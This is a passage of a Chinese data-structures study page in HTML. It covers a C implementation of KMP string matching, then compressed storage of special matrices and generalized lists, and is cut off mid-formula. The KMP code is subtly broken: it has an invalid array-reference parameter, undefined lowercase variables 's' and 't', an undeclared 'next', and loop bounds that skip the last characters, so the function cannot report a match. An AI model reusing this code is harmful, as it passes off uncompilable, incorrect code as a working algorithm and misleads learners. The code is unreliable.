class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXLEN 255</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="type">char</span> ch[MAXLEN + <span class="number">1</span>];<span class="comment">//存储串的一维数组</span></span><br><span class="line">    <span class="type">int</span> length;<span class="comment">//串的当前长度</span></span><br><span class="line">}SString;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_next</span><span class="params">(SString T, <span class="type">int</span> &amp;next[])</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> i = <span class="number">1</span>;</span><br><span class="line">    next[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; T.length)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>(j == <span class="number">0</span> || T.ch[i] == T.ch[j])</span><br><span class="line">        {</span><br><span class="line">            ++i;</span><br><span class="line">            ++j;</span><br><span class="line">            next[i] = j;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            j = next[j];</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Index_KMP</span><span class="params">(SString S, SString T, <span class="type">int</span> pos)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> i=pos, j=<span class="number">1</span>;<span class="comment">//下标从1开始，下标0经常存储串的长度</span></span><br><span class="line">    <span class="keyword">while</span>(i&lt;S.length &amp;&amp; j&lt;T.length)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>(j == <span class="number">0</span> || s.ch[i] == t.ch[j])</span><br><span class="line">        {</span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            j = next[j];<span class="comment">//i不变，j后退</span></span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(j &gt; T.length)</span><br><span class="line">        <span class="keyword">return</span> i - T.length;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>KMP的时间复杂度为O(n+m)。</p><h2 id="2-7-数组"><a href="#2-7-数组" class="headerlink" title="2.7 数组"></a>2.7 数组</h2><h3 id="2-7-1-特殊矩阵的压缩存储"><a href="#2-7-1-特殊矩阵的压缩存储" class="headerlink" title="2.7.1 特殊矩阵的压缩存储"></a>2.7.1 特殊矩阵的压缩存储</h3><p>若多个数据元素的值都相同，则只分配一个元素值的存储空间，且零元素不占存储空间。</p><p>一些特殊矩阵有：对称矩阵、对角矩阵、三角矩阵、稀疏矩阵(矩阵中非零元素的个数较少，一般小于5%)</p><h3 id="2-7-2-对称矩阵"><a href="#2-7-2-对称矩阵" class="headerlink" title="2.7.2 对称矩阵"></a>2.7.2 对称矩阵</h3><p>在n*n的矩阵a中，满足如下性质：</p><script type="math/tex; mode=display">a_{ij} = a_{ji}(1\le i,j\le n)</script><p>存储方法：利用一维数组只存储下(或上)三角(包括主对角线)的数据元素，共占用<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.781ex" xmlns="http://www.w3.org/2000/svg" width="6.204ex" height="3.15ex" role="img" focusable="false" viewBox="0 -1047.1 2742.3 1392.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mfrac"><g data-mml-node="mrow" transform="translate(220,516.8) scale(0.707)"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(600,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(989,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1589,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(2367,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(2867,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(1194.4,-345) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><rect width="2502.3" height="60" x="120" y="220"></rect></g></g></g></svg></mjx-container>个元素空间。</p><h3 id="2-7-3-三角矩阵"><a href="#2-7-3-三角矩阵" class="headerlink" title="2.7.3 三角矩阵"></a>2.7.3 三角矩阵</h3><p>对角线以下(或以上)的数据元素(不包括对角线)全部为常数C。</p><p>存储方法：重复元素C共享一个元素存储空间，共占用<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.781ex" xmlns="http://www.w3.org/2000/svg" width="10.101ex" height="3.15ex" role="img" focusable="false" viewBox="0 -1047.1 4464.8 1392.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mfrac"><g data-mml-node="mrow" transform="translate(220,516.8) scale(0.707)"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(600,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(989,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1589,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(2367,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(2867,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(1194.4,-345) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><rect width="2502.3" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(2964.6,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(3964.8,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container>个元素空间。</p><h3 id="2-7-4-对角矩阵"><a href="#2-7-4-对角矩阵" class="headerlink" title="2.7.4 对角矩阵"></a>2.7.4 对角矩阵</h3><p>在n*n的方阵中，所有非零元素都集中在以主对角线为中心的带状区域中，区域外的值全为0，则称为对角矩阵。常见的有三对角矩阵、五对角矩阵、七对角矩阵等。</p><p>存储方法：用二维数组以对角线的顺序存储。</p><h3 id="2-7-5-稀疏矩阵"><a href="#2-7-5-稀疏矩阵" class="headerlink" title="2.7.5 稀疏矩阵"></a>2.7.5 稀疏矩阵</h3><p>稀疏矩阵顺序存储结构：三元组。</p><p>三元组顺序表又称有序的双下标法。</p><p>优点：非零元在表中按行序有序存储，因此便于进行依行顺序处理的矩阵运算。</p><p>缺点：不能随机存取。若按行号存取某一行中的非零元，则需从头开始进行查找。</p><p>稀疏矩阵链式存储结构：十字链表。</p><p>优点：它能够灵活地插入因运算而产生的新的非零元素，删除因运算而产生的新的零元素，实现矩阵的各种运算。</p><h2 id="2-8-广义表"><a href="#2-8-广义表" class="headerlink" title="2.8 广义表"></a>2.8 广义表</h2><p>广义表(又称列表Lists)是<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.312ex" xmlns="http://www.w3.org/2000/svg" width="5.506ex" height="1.819ex" role="img" focusable="false" viewBox="0 -666 2433.6 804"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(877.8,0)"><path data-c="2265" d="M83 616Q83 624 89 630T99 636Q107 636 253 568T543 431T687 361Q694 356 694 346T687 331Q685 329 395 192L107 56H101Q83 58 83 76Q83 77 83 79Q82 86 98 95Q117 105 248 167Q326 204 378 228L626 346L360 472Q291 505 200 548Q112 589 98 597T83 616ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mn" transform="translate(1933.6,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g></g></svg></mjx-container>个元素<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.471ex" xmlns="http://www.w3.org/2000/svg" width="14.805ex" height="1.468ex" role="img" focusable="false" viewBox="0 -441 6543.7 649"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mn" transform="translate(562,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g><g data-mml-node="mo" transform="translate(965.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(1410.2,0)"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mn" transform="translate(562,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(2375.8,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(2820.4,0)"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"></path></g><g data-mml-node="mo" transform="translate(4159.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(4603.8,0)"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="TeXAtom" transform="translate(562,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(600,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(1378,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></g></svg></mjx-container>的有限序列，其中每一个<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="1.937ex" height="1.355ex" role="img" focusable="false" viewBox="0 -441 856 598.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mi" transform="translate(562,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>或者是原子，或者是一个广义表。</p><p>广义表通常记作<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="20.538ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 9077.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g><g data-mml-node="mi" transform="translate(681,0)"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="mo" transform="translate(1603.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(2659.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(3048.6,0)"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mn" transform="translate(562,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(4014.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(4458.8,0)"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mn" transform="translate(562,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(5424.3,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(5869,0)"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"></path></g><g 